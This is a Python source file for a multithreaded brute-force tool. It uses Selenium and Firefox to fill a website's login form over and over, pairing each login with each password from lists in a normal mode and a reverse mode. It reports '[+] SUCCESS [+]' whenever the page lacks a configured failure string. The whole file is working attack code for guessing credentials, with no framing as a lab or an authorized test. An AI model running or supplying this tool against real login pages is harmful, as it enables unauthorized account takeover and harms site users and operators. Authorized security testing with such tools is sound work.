from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.support.ui import WebDriverWait
from selenium import webdriver
from queue import Queue
from config import *
import threading
import time
import os



### PRINT LOCK ###
print_lock = threading.Lock()
### END PRINT LOCK ###


class TargetObj:
	url = str()
	login_var = str()
	pass_var = str()
	failure_sign = str()
	button_text = str()

	def __init__(self):
		self.__driver = webdriver.Firefox()
		self.__driver.get(TargetObj.url)
		self.__driver.implicitly_wait(10);


	def __get_input(self, var_name):
		return self.__driver.find_element_by_name(var_name)

	def substitute_login(self, login):
		# find login input if it has been reloaded / readded #
		try:
			self.__login_input = self.__get_input(TargetObj.login_var)
			self.__login_input.clear()
			self.__login_input.send_keys(login)
		except NoSuchElementException:
			print(LOGIN_INPUT_ERROR)
			os._exit(1)


	def substitute_password(self, password):
		try:
			self.__pass_input = self.__get_input(TargetObj.pass_var)
			self.__pass_input.clear()
			self.__pass_input.send_keys(password)
		except:
			print(PASSWORD_INPUT_ERROR)
			os._exit(1)


	def submit(self):
		button_xpath = XPATH_CONTAINS.format('button'
                                                    , '.'
                                                    , TargetObj.button_text)
		input_xpath = XPATH_CONTAINS.format('input'
						    , '.'
						    , TargetObj.button_text)
		try:
			button = self.__driver.find_element_by_xpath(button_xpath)
			button.click()
		except NoSuchElementException:
			try:
				button = self.__driver.find_element_by_xpath(input_xpath)
				button.click()
			except:
				try:
					self.__pass_input.submit()
				except:
					print(ATTEMPT_ERROR)
					self.__driver.quit()
		time.sleep(TIME_PAUSE)


	def parse_response(self):
		try:
			body = self.__driver.find_element_by_tag_name("body")
			if self.failure_sign in body.text:
				return "FAIL"
			else:
				return "[+] SUCCESS [+]"
		except:
			return "[!] PARSING PAGE ERROR [!]"

	def exit_driver(self):
		self.__driver.quit()





def login_attempt(target_obj, login, password):
	target_obj.substitute_login(login)
	target_obj.substitute_password(password)
	target_obj.submit()
	return target_obj.parse_response()



def dict_attack(target_obj, queue, password_list):
	"""
	 Dictionary attack of target url based on
	 default brute force (try all password for every login)
	 e.g. login:pass1, login:pass2, login:pass3 and so on.
	"""
	while True:
		login = queue.get()
		for passwd in password_list:
			result = login_attempt(target_obj, login, passwd)
			with print_lock:
				print(LOGIN_ATTEMPT.format(login, passwd, result))
		queue.task_done()


def reverse_dict_attack(target_obj, login_list, queue):
	while True:
		password = queue.get()
		for login in login_list:
			result = login_attempt(target_obj, login, password)
			with print_lock:
				print(LOGIN_ATTEMPT.format(login, password, result))
		queue.task_done()



def brute_force(logins, passwords, num_threads, reverse = False):
	queue = Queue()
	# list with objects of TargetObj class #
	target_objs = []
	if reverse == False:
		for login in logins:
			queue.put(login)
		for thread_counter in range(num_threads):
			# creating target object with driver for each thread #
			obj_per_thread = TargetObj()
			target_objs.append(obj_per_thread)
			thrd = threading.Thread(target = dict_attack
                                    , args = (obj_per_thread, queue, passwords))
			thrd.daemon = True
			thrd.start()


	else:
		for passwd in passwords:
				queue.put(passwd)
		for thread_counter in range(num_threads):
			obj_per_thread = TargetObj()
			target_objs.append(obj_per_thread)
			thrd = threading.Thread(target = reverse_dict_attack
                                    , args = (obj_per_thread, logins, queue))
			thrd.daemon = True
			thrd.start()

	queue.join()

	# quit drivers #
	for obj in target_objs:
		obj.exit_driver();
